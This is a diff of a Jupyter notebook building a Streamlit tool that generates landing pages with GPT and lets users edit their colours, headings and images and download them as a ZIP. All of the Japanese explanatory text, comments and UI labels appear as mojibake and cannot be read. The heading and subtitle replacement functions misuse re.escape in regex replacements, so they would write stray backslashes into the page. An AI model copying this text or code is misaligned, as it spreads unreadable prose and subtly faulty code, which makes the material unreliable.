+    "  â†’ æœ€åˆã® `<h1>` ã®æ–‡å­—ã‚’å–å¾— / æ›¸ãæ›ãˆ  \n",
+    "- `extract_subtext(html)` / `replace_subtext(html, new_text)`  \n",
+    "  â†’ `class=\"sub\"` ã¾ãŸã¯ `class=\"lead\"` ã®è¦ç´ ã‚’å–å¾— / æ›¸ãæ›ãˆ\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### 4ï¸âƒ£ æ­£è¦è¡¨ç¾ã«ã¤ã„ã¦\n",
+    "\n",
+    "`VAR_RE` ã‚„ `IMG_PLACEHOLDER_RE` ã¯ã€Œæ­£è¦è¡¨ç¾ï¼ˆRegular Expressionï¼‰ã€ã§æ›¸ã‹ã‚Œã¦ã„ã¾ã™ã€‚\n",
+    "ã“ã‚Œã¯ { ã¨ } ã«å›²ã¾ã‚Œã¦ã„ã‚‹ä¸­èº«ã‚’å–ã‚Šå‡ºã™ãŸã‚ã«ä½œã£ã¦ã„ã¾ã™ã€‚\n",
+    "\n",
+    "- ä¾‹ï¼š`\\s*\\{([^}]*)\\}`  \n",
+    "  - `\\s*` â†’ ç©ºç™½ã‚’0å€‹ä»¥ä¸Š  \n",
+    "  - `\\{` â†’ `{` ã‚’æ¢ã™  \n",
+    "  - `([^}]*)` â†’ `}` ä»¥å¤–ã®æ–‡å­—ã‚’å…¨éƒ¨ã¾ã¨ã‚ã¦å–ã‚Šå‡ºã™  \n",
+    "  - `\\}` â†’ `}` ã‚’æ¢ã™\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### ğŸ’¡ ã¾ã¨ã‚\n",
+    "\n",
+    "| åˆ†é¡ | é–¢æ•° | ä¸»ãªå½¹å‰² |\n",
+    "|---|---|---|\n",
+    "| **CSS** | `extract_root_vars` / `replace_root_vars` | `:root` ã® CSSå¤‰æ•°ã‚’æŠ½å‡ºãƒ»æ›´æ–° |\n",
+    "| **ç”»åƒ** | `find_image_placeholders` / `data_uri_from_file` / `replace_placeholder_with_img` | ãƒ€ãƒŸãƒ¼ç”»åƒã‚’å®Ÿç”»åƒã«å·®ã—æ›¿ãˆ |\n",
+    "| **ãƒ†ã‚­ã‚¹ãƒˆ** | `extract_first_h1` / `replace_first_h1` / `extract_subtext` / `replace_subtext` | è¦‹å‡ºã—ã‚„ã‚µãƒ–ã‚³ãƒ”ãƒ¼ã‚’å–å¾—ãƒ»ç·¨é›† |\n",
+    "\n",
+    "> ã“ã‚Œã‚‰ã®ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£é–¢æ•°ã¯ã€**AI ãŒä½œã£ãŸãƒ‡ã‚¶ã‚¤ãƒ³ã‚’ã€Œãã®ã¾ã¾è¡¨ç¤ºã€ã§ã¯ãªãã€Œè‡ªç”±ã«èª¿æ•´ã€ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã®è¨­è¨ˆ**ã§ã™ã€‚\n",
+    "\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 19,
+   "id": "a03a32f0",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "\n",
+    "VAR_RE = re.compile(r\":root\\s*\\{([^}]*)\\}\", re.S)\n",
+    "IMG_PLACEHOLDER_RE = re.compile(\n",
+    "    r'(<div[^>]*?(aria-label\\s*=\\s*\"image\"[^>]*|class\\s*=\\s*\"[^\"]*img[^\"]*\"[^>]*)>)(.*?)</div>',\n",
+    "    re.I | re.S\n",
+    ")\n",
+    "\n",
+    "def extract_root_vars(css_text: str) -> Dict[str, str]:\n",
+    "    m = VAR_RE.search(css_text)\n",
+    "    if not m: return {}\n",
+    "    vars_: Dict[str, str] = {}\n",
+    "    for line in m.group(1).split(\";\"):\n",
+    "        if \":\" in line:\n",
+    "            k, v = line.split(\":\", 1)\n",
+    "            if k.strip().startswith(\"--\") and v.strip():\n",
+    "                vars_[k.strip()] = v.strip()\n",
+    "    return vars_\n",
+    "\n",
+    "def replace_root_vars(css_text: str, new_vars: Dict[str, str]) -> str:\n",
+    "    def repl(match: re.Match) -> str:\n",
+    "        block = match.group(1)\n",
+    "        pairs, seen = [], set()\n",
+    "        for ln in block.split(\";\"):\n",
+    "            if \":\" in ln:\n",
+    "                k, v = ln.split(\":\", 1)\n",
+    "                key = k.strip()\n",
+    "                if key in new_vars:\n",
+    "                    pairs.append(f\"{key}: {new_vars[key]}\"); seen.add(key)\n",
+    "                else:\n",
+    "                    pairs.append(f\"{key}:{v}\")\n",
+    "        for k, v in new_vars.items():\n",
+    "            if k not in seen: pairs.append(f\"{k}: {v}\")\n",
+    "        return \":root{\" + \";\".join(pairs) + \"}\"\n",
+    "\n",
+    "    if not VAR_RE.search(css_text):\n",
+    "        head = \":root{\" + \";\".join([f\"{k}:{v}\" for k, v in new_vars.items()]) + \"}\"\n",
+    "        return head + css_text\n",
+    "    return VAR_RE.sub(repl, css_text, count=1)\n",
+    "\n",
+    "def find_image_placeholders(html: str) -> List[Tuple[int, str]]:\n",
+    "    return [(m.start(), m.group(0)) for m in IMG_PLACEHOLDER_RE.finditer(html)]\n",
+    "\n",
+    "def data_uri_from_file(file) -> Tuple[str, str]:\n",
+    "    data = file.read()\n",
+    "    mime = file.type or \"application/octet-stream\"\n",
+    "    ext = \"png\"\n",
+    "    if \"jpeg\" in mime: ext = \"jpg\"\n",
+    "    elif \"webp\" in mime: ext = \"webp\"\n",
+    "    b64 = base64.b64encode(data).decode(\"ascii\")\n",
+    "    return f\"data:{mime};base64,{b64}\", ext\n",
+    "\n",
+    "def replace_placeholder_with_img(html: str, placeholder_html: str, data_uri: str) -> str:\n",
+    "    cls = \"\"\n",
+    "    m = re.search(r'class\\s*=\\s*\"([^\"]+)\"', placeholder_html, re.I)\n",
+    "    if m: cls = m.group(1)\n",
+    "    alt = \"image\"\n",
+    "    m2 = re.search(r'aria-label\\s*=\\s*\"([^\"]+)\"', placeholder_html, re.I)\n",
+    "    if m2: alt = m2.group(1)\n",
+    "    img = f'<img src=\"{data_uri}\" alt=\"{alt}\" class=\"{cls}\"/>'\n",
+    "    return html.replace(placeholder_html, img, 1)\n",
+    "\n",
+    "def extract_first_h1(html: str) -> str:\n",
+    "    m = re.search(r\"<h1[^>]*>(.*?)</h1>\", html, re.S | re.I)\n",
+    "    return (m.group(1).strip() if m else \"\")\n",
+    "\n",
+    "def replace_first_h1(html: str, new_text: str) -> str:\n",
+    "    return re.sub(r\"(<h1[^>]*>)(.*?)(</h1>)\", r\"\\1\" + re.escape(new_text) + r\"\\3\",\n",
+    "                  html, count=1, flags=re.S | re.I)\n",
+    "\n",
+    "def extract_subtext(html: str) -> str:\n",
+    "    m = re.search(r\"<(p|div)\\s+class=['\\\"](sub|lead)['\\\"][^>]*>(.*?)</\\1>\", html, re.S | re.I)\n",
+    "    return (m.group(3).strip() if m else \"\")\n",
+    "\n",
+    "def replace_subtext(html: str, new_text: str) -> str:\n",
+    "    return re.sub(r\"(<(p|div)\\s+class=['\\\"](sub|lead)['\\\"][^>]*>)(.*?)(</\\2>)\",\n",
+    "                  r\"\\1\" + re.escape(new_text) + r\"\\5\",\n",
+    "                  html, count=1, flags=re.S | re.I)\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "6dbff4f2",
+   "metadata": {},
+   "source": [
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³7ï¼šç”Ÿæˆãƒœã‚¿ãƒ³ & ã‚»ãƒƒã‚·ãƒ§ãƒ³çŠ¶æ…‹\n",
+    "\n",
+    "- `st.session_state` ã«ç”Ÿæˆå¾Œã® HTML / CSS / ç”»åƒã‚¹ãƒ­ãƒƒãƒˆã‚’ä¿æŒ  \n",
+    "- ã€ŒLPã‚’ç”Ÿæˆã€ãƒœã‚¿ãƒ³ã‚’æŠ¼ã™ã¨ `ai_generate()` ãŒå‘¼ã°ã‚Œã€CSS ã¨ HTML ã‚’ç”Ÿæˆ  \n",
+    "- æˆåŠŸæ™‚ã¯å®Œæˆç‰ˆã® `index.html` ã‚’çµ„ã¿ç«‹ã¦ã¦ `session_state` ã«ä¿å­˜  \n",
+    "- å†å®Ÿè¡Œï¼ˆStreamlit ã®**æ¯ãƒ•ãƒ¬ãƒ¼ãƒ å®Ÿè¡Œ**ï¼‰ã§ã‚‚çµæœã‚’ç¶­æŒã§ãã‚‹ã‚ˆã†ã«è¨­è¨ˆ\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 20,
+   "id": "9e8733d3",
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "2025-09-15 11:13:48.360 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:13:48.368 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:13:48.369 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:13:48.374 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:13:48.400 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:13:48.419 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:13:48.472 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:13:48.495 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:13:48.503 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
+     ]
+    }
+   ],
+   "source": [
+    "\n",
+    "if \"gen_html\" not in st.session_state: st.session_state.gen_html = \"\"\n",
+    "if \"gen_css\"  not in st.session_state: st.session_state.gen_css  = \"\"\n",
+    "if \"img_slots\" not in st.session_state: st.session_state.img_slots = []\n",
+    "\n",
+    "gen_clicked = st.button(\"ğŸ¯ LPã‚’ç”Ÿæˆï¼ˆAIï¼‰\", type=\"primary\")\n",
+    "\n",
+    "if gen_clicked:\n",
+    "    try:\n",
+    "        css, body = ai_generate(\n",
+    "            theme, site_title, tagline, meta_desc, email,\n",
+    "            about_text, split_csv(features_csv), split_csv(works_csv), parse_testimonials(testi_raw),\n",
+    "            temperature\n",
+    "        )\n",
+    "    except RateLimitError as e:\n",
+    "        st.error(\"ãƒ¬ãƒ¼ãƒˆä¸Šé™/ã‚¯ã‚©ãƒ¼ã‚¿ã«é”ã—ã¾ã—ãŸã€‚\"); st.exception(e)\n",
+    "    except APIStatusError as e:\n",
+    "        st.error(f\"APIã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚¨ãƒ©ãƒ¼: {e.status_code}\"); st.exception(e)\n",
+    "    except Exception as e:\n",
+    "        st.error(\"AIç”Ÿæˆã«å¤±æ•—ã—ã¾ã—ãŸï¼ˆã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«/ã‚­ãƒ¼/ãƒ¢ãƒ‡ãƒ«æ¨©é™ã‚’ã”ç¢ºèªãã ã•ã„ï¼‰ã€‚\"); st.exception(e)\n",
+    "    else:\n",
+    "        html = f\"\"\"<!DOCTYPE html>\n",
+    "<html lang=\"ja\">\n",
+    "<head>\n",
+    "  <meta charset=\"utf-8\" />\n",
+    "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n",
+    "  <title>{site_title} â€“ Landing</title>\n",
+    "  <meta name=\"description\" content=\"{meta_desc}\">\n",
+    "  <link rel=\"stylesheet\" href=\"./styles.css\" />\n",
+    "</head>\n",
+    "<body>\n",
+    "{body}\n",
+    "</body>\n",
+    "</html>\"\"\"\n",
+    "\n",
+    "        st.session_state.gen_html  = html\n",
+    "        st.session_state.gen_css   = css\n",
+    "        st.session_state.img_slots = find_image_placeholders(body)\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "81c8e70a",
+   "metadata": {},
+   "source": [
+    "\n",
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³8ï¼šãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼ & ã‚¨ãƒ‡ã‚£ã‚¿\n",
+    "\n",
+    "ç”Ÿæˆã—ãŸ HTML/CSS ã‚’å·¦ã§ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼ã€å³ã§ç·¨é›†ã§ãã‚‹ UI ã‚’ä½œã‚Šã¾ã™ã€‚  \n",
+    "æ¬¡ã®4ã¤ã®ç·¨é›†æ©Ÿèƒ½ã‚’ã¾ã¨ã‚ã¦æä¾›ã—ã¾ã™ã€‚\n",
+    "\n",
+    "1. **ãƒ†ãƒ¼ãƒç·¨é›†ï¼ˆ:root å¤‰æ•°ï¼‰**  \n",
+    "   - ã‚«ãƒ©ãƒ¼ã‚„è§’ä¸¸ã‚’ GUIï¼ˆã‚«ãƒ©ãƒ¼ãƒ”ãƒƒã‚«ãƒ¼ï¼ã‚¹ãƒ©ã‚¤ãƒ€ãƒ¼ï¼‰ã§èª¿æ•´ã—ã€`replace_root_vars()` ã§åæ˜ \n",
+    "\n",
+    "2. **ãƒ†ã‚­ã‚¹ãƒˆç·¨é›†ï¼ˆH1 / ã‚µãƒ–ï¼‰**  \n",
+    "   - è¦‹å‡ºã—ã¨ã‚µãƒ–ã‚³ãƒ”ãƒ¼ã‚’ `extract_*` / `replace_*` ã§å®‰å…¨ã«å·®ã—æ›¿ãˆ\n",
+    "\n",
+    "3. **ç”»åƒå·®ã—æ›¿ãˆ**  \n",
+    "   - ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ `<div>` ã‚’ `file_uploader` â†’ `data_uri_from_file()` â†’ `<img>` ã«ç½®æ›\n",
+    "\n",
+    "4. **AI å·®åˆ†ç·¨é›†**  \n",
+    "   - GPT ã«ã€Œé…ç½®å¤‰æ›´ãƒ»è£…é£¾å¤‰æ›´ã€ã‚’æŒ‡ç¤ºã—ã€JSON å½¢å¼ `{css, body_html}` ã§å·®ã—æˆ»ã—  \n",
+    "   - `sanitize_html()` ã‚’é€šã—ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„å±é™ºå±æ€§ã‚’é™¤å»\n",
+    "\n",
+    " ç›®çš„ï¼š**ç”Ÿæˆã—ãŸLPã‚’å³ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼ã—ãªãŒã‚‰å®‰å…¨ã«ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚º** ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã€‚\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 21,
+   "id": "474ca236",
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "2025-09-15 11:19:22.731 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
+     ]
+    }
+   ],
+   "source": [
+    "\n",
+    "if st.session_state.gen_html and st.session_state.gen_css:\n",
+    "    colA, colB = st.columns([7, 5])\n",
+    "\n",
+    "    # ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼\n",
+    "    with colA:\n",
+    "        st.subheader(\"ğŸ” ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼\")\n",
+    "        body_only = st.session_state.gen_html.split(\"<body>\", 1)[1]                                              .rsplit(\"</body>\", 1)[0]\n",
+    "        inline = f\"\"\"<!DOCTYPE html><html><head><meta charset='utf-8'>\n",
+    "<meta name='viewport' content='width=device-width, initial-scale=1'>\n",
+    "<style>{st.session_state.gen_css}</style></head><body>{body_only}</body></html>\"\"\"\n",
+    "        components.html(inline, height=960, scrolling=True)\n",
+    "\n",
+    "    with colB:\n",
+    "        st.subheader(\"ğŸ›  ã‚¨ãƒ‡ã‚£ã‚¿\")\n",
+    "\n",
+    "        # :root å¤‰æ•°ç·¨é›†\n",
+    "        vars_now = extract_root_vars(st.session_state.gen_css)\n",
+    "        color_keys  = [k for k in vars_now if any(x in vars_now[k] for x in [\"#\", \"rgb\", \"hsl\"])]\n",
+    "        radius_keys = [k for k in vars_now if \"radius\" in k or k == \"--r\"]\n",
+    "\n",
+    "        with st.expander(\"ğŸ¨ ã‚«ãƒ©ãƒ¼ & ãƒˆãƒ¼ã‚¯ãƒ³ç·¨é›†\", expanded=True):\n",
+    "            new_vars: Dict[str, str] = {}\n",
+    "            for k in color_keys:\n",
+    "                v = vars_now[k].strip()\n",
+    "                new_vars[k] = st.color_picker(k, v) if v.startswith(\"#\") and len(v) in (4, 7) else st.text_input(k, v)\n",
+    "            for k in radius_keys:\n",
+    "                m = re.search(r\"(\\d+)\", vars_now[k]); init = int(m.group(1)) if m else 12\n",
+    "                px = st.slider(f\"{k}ï¼ˆpxï¼‰\", 0, 40, init); new_vars[k] = f\"{px}px\"\n",
+    "            if st.button(\"â¬† CSSã«åæ˜ \"):\n",
+    "                st.session_state.gen_css = replace_root_vars(st.session_state.gen_css, new_vars)\n",
+    "                st.success(\"CSSï¼ˆ:rootï¼‰ã‚’æ›´æ–°ã—ã¾ã—ãŸã€‚\")\n",
+    "\n",
+    "        # ãƒ†ã‚­ã‚¹ãƒˆç·¨é›†\n",
+    "        with st.expander(\"âœï¸ ãƒ†ã‚­ã‚¹ãƒˆç·¨é›†ï¼ˆæœ€åˆã®H1 & ã‚µãƒ–ï¼‰\", expanded=False):\n",
+    "            curr_body = st.session_state.gen_html.split(\"<body>\", 1)[1].rsplit(\"</body>\", 1)[0]\n",
+    "            curr_h1  = extract_first_h1(curr_body)\n",
+    "            curr_sub = extract_subtext(curr_body)\n",
+    "            new_h1   = st.text_input(\"H1\", curr_h1 or site_title)\n",
+    "            new_sub  = st.text_input(\"ã‚µãƒ–ï¼ˆ.sub / .leadï¼‰\", curr_sub or tagline)\n",
+    "            if st.button(\"â¬† ãƒ†ã‚­ã‚¹ãƒˆåæ˜ \"):\n",
+    "                body = curr_body\n",
+    "                if curr_h1:  body = replace_first_h1(body, new_h1)\n",
+    "                if curr_sub: body = replace_subtext(body, new_sub)\n",
+    "                st.session_state.gen_html = st.session_state.gen_html.replace(curr_body, body)\n",
+    "                st.success(\"ãƒ†ã‚­ã‚¹ãƒˆã‚’æ›´æ–°ã—ã¾ã—ãŸã€‚\")\n",
+    "\n",
+    "        # ç”»åƒå·®ã—æ›¿ãˆ\n",
+    "        with st.expander(\"ğŸ–¼ ç”»åƒå·®ã—æ›¿ãˆï¼ˆãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ï¼‰\", expanded=False):\n",
+    "            curr_body = st.session_state.gen_html.split(\"<body>\", 1)[1].rsplit(\"</body>\", 1)[0]\n",
+    "            if not st.session_state.img_slots:\n",
+    "                st.info(\"ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ï¼ˆaria-label=\\\"image\\\" ã¾ãŸã¯ class=\\\"img ...\\\"ï¼‰ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã€‚\")\n",
+    "            else:\n",
+    "                updated = False\n",
+    "                for idx, (_, ph_html) in enumerate(st.session_state.img_slots):\n",
+    "                    up = st.file_uploader(f\"ç”»åƒ {idx+1}\", type=[\"png\", \"jpg\", \"jpeg\", \"webp\"], key=f\"u_{idx}\")\n",
+    "                    if up is not None:\n",
+    "                        data_uri, _ = data_uri_from_file(up)\n",
+    "                        curr_body = replace_placeholder_with_img(curr_body, ph_html, data_uri)\n",
+    "                        updated = True\n",
+    "                if updated:\n",
+    "                    st.session_state.gen_html = st.session_state.gen_html.replace(\n",
+    "                        st.session_state.gen_html.split(\"<body>\", 1)[1].rsplit(\"</body>\", 1)[0],\n",
+    "                        curr_body\n",
+    "                    )\n",
+    "                    st.session_state.img_slots = find_image_placeholders(curr_body)\n",
+    "                    st.success(\"ç”»åƒã‚’åæ˜ ã—ã¾ã—ãŸã€‚\")\n",
+    "\n",
+    "        # AIå·®åˆ†ç·¨é›†\n",
+    "        with st.expander(\"ğŸ¤– AIã«æŒ‡ç¤ºã—ã¦å†ç·¨é›†ï¼ˆå·®åˆ†é©ç”¨ï¼‰\", expanded=False):\n",
+    "            st.write(\"ä¾‹ï¼‰ã€ãƒ’ãƒ¼ãƒ­ãƒ¼ã‚’å·¦å³2ã‚«ãƒ©ãƒ ã«ã€ã€å¯æ„›ã„æ–¹å‘ã«ã€ã€è§’ä¸¸20pxã€ã€ä½™ç™½ã‚’åºƒã‚ã€ã€ãƒã‚ªãƒ³æ„Ÿå¼·ã‚ã€ãªã©\")\n",
+    "            ai_edit_prompt = st.text_area(\"AIã¸ã®æŒ‡ç¤ºï¼ˆæ—¥æœ¬èªã§OKï¼‰\", height=90)\n",
+    "\n",
+    "            def ai_edit(css_text: str, body_html: str, instruction: str) -> Tuple[str, str]:\n",
+    "                if client is None:\n",
+    "                    raise RuntimeError(\"OpenAI ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒåˆæœŸåŒ–ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚APIã‚­ãƒ¼è¨­å®šã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚\")\n",
+    "                sys = \"ã‚ãªãŸã¯ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰/ãƒ‡ã‚¶ã‚¤ãƒ³ã®å°‚é–€å®¶ã§ã™ã€‚å®‰å…¨ãªç´”HTML+CSSã®ã¿ã§ç·¨é›†ã—ã¾ã™ã€‚\"\n",
+    "                user = f\"\"\"\n",
+    "ã“ã‚Œã‹ã‚‰ä¸ãˆã‚‹ 'css' ã¨ 'body_html' ã‚’ã€æŒ‡ç¤ºã«å¾“ã£ã¦**ç›´æ¥æ›¸ãæ›ãˆ**ã¦ãã ã•ã„ã€‚\n",
+    "- è¿”ç­”ã¯ JSON 1å€‹ã€ã‚¹ã‚­ãƒ¼ãƒã¯ {{ \"css\": \"...\", \"body_html\": \"...\" }} ã®ã¿\n",
+    "- scriptã‚¿ã‚°ãƒ»å¤–éƒ¨CDNãƒ»@import ã¯ç¦æ­¢\n",
+    "- onClick ç­‰ã® on* ã¯ä½¿ã‚ãªã„\n",
+    "- ç”»åƒã¯æ—¢å­˜ã®ãƒ€ãƒŸãƒ¼div/imgã‚’æ•´å½¢ï¼ˆæ–°è¦èª­ã¿è¾¼ã¿ç¦æ­¢ï¼‰\n",
+    "\n",
+    "[ç¾åœ¨ã®CSS]\n",
+    "{css_text}\n",
+    "\n",
+    "[ç¾åœ¨ã®BODY]\n",
+    "{body_html}\n",
+    "\n",
+    "[ç·¨é›†æŒ‡ç¤º]\n",
+    "{instruction}\n",
+    "\"\"\"\n",
+    "                resp = client.chat.completions.create(\n",
+    "                    model=\"gpt-4o-mini\",\n",
+    "                    temperature=0.8,\n",
+    "                    response_format={\"type\": \"json_object\"},\n",
+    "                    messages=[{\"role\": \"system\", \"content\": sys}, {\"role\": \"user\", \"content\": user}],\n",
+    "                )\n",
+    "                dat = json.loads(resp.choices[0].message.content)\n",
+    "                return dat.get(\"css\", \"\"), sanitize_html(dat.get(\"body_html\", \"\"))\n",
+    "\n",
+    "            if st.button(\"ğŸª„ æŒ‡ç¤ºã©ãŠã‚ŠAIã§å†ç·¨é›†ã™ã‚‹\"):\n",
+    "                try:\n",
+    "                    curr_body = st.session_state.gen_html.split(\"<body>\", 1)[1].rsplit(\"</body>\", 1)[0]\n",
+    "                    new_css, new_body = ai_edit(\n",
+    "                        st.session_state.gen_css,\n",
+    "                        curr_body,\n",
+    "                        ai_edit_prompt.strip() or \"å…¨ä½“ã‚’æ´—ç·´ã€‚ä½™ç™½ã¨éšå±¤ã®ã‚³ãƒ³ãƒˆãƒ©ã‚¹ãƒˆã‚’èª¿æ•´ã€‚\"\n",
+    "                    )\n",
+    "                    if new_css:\n",
+    "                        st.session_state.gen_css = new_css\n",
+    "                    if new_body:\n",
+    "                        st.session_state.gen_html = st.session_state.gen_html.replace(curr_body, new_body)\n",
+    "                        st.session_state.img_slots = find_image_placeholders(new_body)\n",
+    "                    st.success(\"AIå·®åˆ†ç·¨é›†ã‚’åæ˜ ã—ã¾ã—ãŸã€‚\")\n",
+    "                except Exception as e:\n",
+    "                    st.error(\"AIå·®åˆ†ç·¨é›†ã«å¤±æ•—ã—ã¾ã—ãŸã€‚\"); st.exception(e)\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "3adfa79b",
+   "metadata": {},
+   "source": [
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³9ï¼šã‚³ãƒ¼ãƒ‰è¡¨ç¤º & ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ï¼ˆZIPåŒ–ï¼‰\n",
+    "\n",
+    "ç”Ÿæˆã—ãŸ HTML/CSS ã‚’é–²è¦§ã—ã€ãã®ã¾ã¾ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹ä»•çµ„ã¿ã€‚\n",
+    "\n",
+    "1. **å˜ä½“ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**\n",
+    "   - `st.tabs()` ã§ã€Œindex.htmlã€ã€Œstyles.cssã€ã‚’è¡¨ç¤º\n",
+    "   - `st.download_button()` ã§å€‹åˆ¥ã«DL\n",
+    "\n",
+    "2. **ZIPä¸€æ‹¬ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**\n",
+    "   - `to_zip()` ãŒ HTML å†…ã® `data:` ç”»åƒã‚’æŠ½å‡ºã—ã€`assets/` ã«å±•é–‹\n",
+    "   - `index.html` / `styles.css` / ç”»åƒã‚’ã¾ã¨ã‚ã¦ ZIP ã«æ ¼ç´\n",
+    "\n",
+    "ç›®çš„ï¼š**LPã‚’ã™ãã«é…å¸ƒãƒ»ãƒ‡ãƒ—ãƒ­ã‚¤ã§ãã‚‹å½¢å¼ã«å¤‰æ›** ã™ã‚‹ã€‚\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 22,
+   "id": "f584f33e",
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "2025-09-15 11:25:30.813 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:25:30.835 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:25:30.843 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 11:25:30.845 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
+     ]
+    }
+   ],
+   "source": [
+    "\n",
+    "if st.session_state.gen_html and st.session_state.gen_css:\n",
+    "    st.subheader(\"ğŸ§© ç”Ÿæˆã‚³ãƒ¼ãƒ‰ / ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰\")\n",
+    "    tabs = st.tabs([\"index.html\", \"styles.css\"])\n",
+    "\n",
+    "    with tabs[0]:\n",
+    "        st.code(st.session_state.gen_html, language=\"html\")\n",
+    "        st.download_button(\"index.html ã‚’DL\", st.session_state.gen_html.encode(\"utf-8\"), file_name=\"index.html\")\n",
+    "\n",
+    "    with tabs[1]:\n",
+    "        st.code(st.session_state.gen_css, language=\"css\")\n",
+    "        st.download_button(\"styles.css ã‚’DL\", st.session_state.gen_css.encode(\"utf-8\"), file_name=\"styles.css\")\n",
+    "\n",
+    "    def to_zip(html: str, css: str) -> bytes:\n",
+    "        buf = io.BytesIO()\n",
+    "        with zipfile.ZipFile(buf, \"w\", zipfile.ZIP_DEFLATED) as z:\n",
+    "            html_out = html\n",
+    "            matches = re.findall(r'src=\"data:[^\"]+\"', html_out)\n",
+    "            img_index = 1\n",
+    "            for m in matches:\n",
+    "                data_uri = m.split('\"', 1)[1].rsplit('\"', 1)[0]\n",
+    "                if \";base64,\" in data_uri:\n",
+    "                    parts = data_uri.split(\";base64,\", 1)\n",
+    "                    if len(parts) == 1:\n",
+    "                        parts = data_uri.split(\";base64;\", 1)\n",
+    "                    head, b64 = parts[0], parts[1]\n",
+    "                    if \"image/png\" in head: ext = \"png\"\n",
+    "                    elif \"image/webp\" in head: ext = \"webp\"\n",
+    "                    elif \"image/jpeg\" in head or \"image/jpg\" in head: ext = \"jpg\"\n",
+    "                    else: ext = \"png\"\n",
+    "                    data = base64.b64decode(b64)\n",
+    "                    path = f\"assets/img_{img_index}.{ext}\"\n",
+    "                    z.writestr(path, data)\n",
+    "                    html_out = html_out.replace(data_uri, \"./\" + path, 1)\n",
+    "                    img_index += 1\n",
+    "            z.writestr(\"index.html\", html_out)\n",
+    "            z.writestr(\"styles.css\", css)\n",
+    "            z.writestr(\"script.js\", \"\")\n",
+    "        buf.seek(0); return buf.getvalue()\n",
+    "\n",
+    "    st.download_button(\n",
+    "        \"ğŸ“¦ ä¸€æ‹¬ZIPï¼ˆNetlifyç”¨ï¼‰\",\n",
+    "        to_zip(st.session_state.gen_html, st.session_state.gen_css),\n",
+    "        file_name=\"lp_site_ai_editable.zip\"\n",
+    "    )\n",
+    "else:\n",
+    "    st.info(\"å·¦ã‚µã‚¤ãƒ‰ãƒãƒ¼ã‚’è¨­å®šã—ã¦ï¼»ğŸ¯ LPã‚’ç”Ÿæˆï¼ˆAIï¼‰ï¼½ã‚’æŠ¼ã—ã¦ãã ã•ã„ã€‚ç”Ÿæˆå¾Œã«å³å´ã§è‰²/ãƒ†ã‚­ã‚¹ãƒˆ/ç”»åƒ/AIå·®åˆ†ç·¨é›†ãŒã§ãã¾ã™ã€‚\")\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
